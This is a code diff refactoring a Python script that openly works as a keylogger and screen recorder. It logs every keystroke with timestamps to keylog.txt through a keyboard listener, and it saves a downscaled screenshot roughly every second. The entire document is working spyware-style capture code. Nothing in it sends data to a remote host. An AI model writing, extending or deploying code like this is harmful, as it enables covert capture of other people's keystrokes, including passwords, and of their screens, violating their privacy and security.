@@ -11,9 +11,15 @@ import tkinter as tk
 import cv2 as cv
 import numpy as np
 
-logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
-with mss.mss() as sct:
+
+def on_press(key):
+    logging.info(str(key))
+
+
+# with mss.mss() as sct:
+def yolo(grabber):
     root = tk.Tk()
     screen_width = root.winfo_screenwidth()
     screen_height = root.winfo_screenheight()
@@ -22,29 +28,26 @@ with mss.mss() as sct:
     last_time = 0
     while "Screen capturing":
         if time.time() - last_time > 1:
-            output = str(last_time)+".jpeg".format(**monitor)
-            sct.compression_level = 2
+            output = str(last_time) + ".jpeg".format(**monitor)
+            grabber.compression_level = 2
             # Grab the data
-            sct_img = sct.grab(monitor)
+            sct_img = grabber.grab(monitor)
             screenshot = np.array(sct_img)
 
             image = cv.pyrDown(screenshot)
             cv.imwrite(output, image)
             # Save to the picture file
-            #mss.tools.tp(sct_img.rgb, sct_img.size, output=output)
+            # mss.tools.tp(sct_img.rgb, sct_img.size, output=output)
 
             print(output)
             last_time = time.time()
 
-def on_press(key):
-    logging.info(str(key))
-
 
 with Listener(on_press=on_press) as listener:
+
+    sct = mss.mss()
+    yolo(sct)
     listener.join()
-with mss.mss() as sct:
-    filename = sct.shot(output="mon-{mon}.png")
-    print(filename)
 
 
 def print_hi(name):
